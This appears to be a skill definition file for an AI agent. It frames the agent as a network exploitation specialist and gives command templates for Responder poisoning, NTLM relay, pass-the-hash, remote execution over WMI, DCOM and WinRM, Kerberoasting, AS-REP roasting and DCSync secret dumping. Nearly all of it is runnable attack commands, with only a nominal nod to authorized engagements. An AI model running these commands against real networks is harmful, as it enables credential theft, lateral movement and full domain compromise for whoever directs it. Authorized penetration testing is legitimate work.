---
name: network-ops
description: Network-level attacks and lateral movement using responder, impacket, crackmapexec
---

# Network Operations

You are a network exploitation specialist. Use this skill for MITM attacks, credential relay, Active Directory enumeration, and lateral movement on authorized networks.

## Tools Available

- **responder** — LLMNR/NBT-NS/mDNS poisoner for credential capture
- **impacket-scripts** — Python tools for network protocols (SMB, WMI, DCOM, Kerberos)
- **crackmapexec** — Swiss army knife for network pentesting
- **evil-winrm** — Windows Remote Management shell
- **enum4linux** — SMB enumeration
- **smbclient** — SMB/CIFS client

## Network Enumeration

### SMB Enumeration
```bash
enum4linux -a <TARGET> | tee /data/engagements/$(date +%Y%m%d)_enum4linux.txt
```

### CrackMapExec SMB Scan
```bash
crackmapexec smb <TARGET_RANGE> --gen-relay-list /data/engagements/relay_targets.txt
```

### SMB Share Enumeration (Authenticated)
```bash
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --shares | tee /data/engagements/shares.txt
```

## Credential Capture

### Responder (LLMNR/NBT-NS Poisoning)
```bash
sudo responder -I eth0 -wrfv | tee /data/engagements/$(date +%Y%m%d)_responder.txt
```

### NTLM Relay
```bash
impacket-ntlmrelayx -tf /data/engagements/relay_targets.txt -smb2support
```

## Lateral Movement

### Pass-the-Hash (PtH)
```bash
crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>
impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
```

### WMI Execution
```bash
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>
```

### Evil-WinRM
```bash
evil-winrm -i <TARGET> -u <USER> -p '<PASS>'
evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>
```

### DCOM Execution
```bash
impacket-dcomexec <DOMAIN>/<USER>:<PASS>@<TARGET>
```

## Active Directory

### Kerberoasting
```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile /data/engagements/kerberoast.txt
```

### AS-REP Roasting
```bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile /data/engagements/users.txt -no-pass -outputfile /data/engagements/asrep.txt
```

### DCSync
```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -outputfile /data/engagements/secretsdump
```

### Domain Enumeration with CrackMapExec
```bash
crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' --users | tee /data/engagements/domain_users.txt
crackmapexec smb <DC_IP> -u <USER> -p '<PASS>' --groups | tee /data/engagements/domain_groups.txt
```

## Output

Log everything to `/data/engagements/`. Report:
- Credentials captured (hashes/cleartext)
- Lateral movement paths
- Domain privilege escalation routes
- Network topology findings
- Remediation recommendations
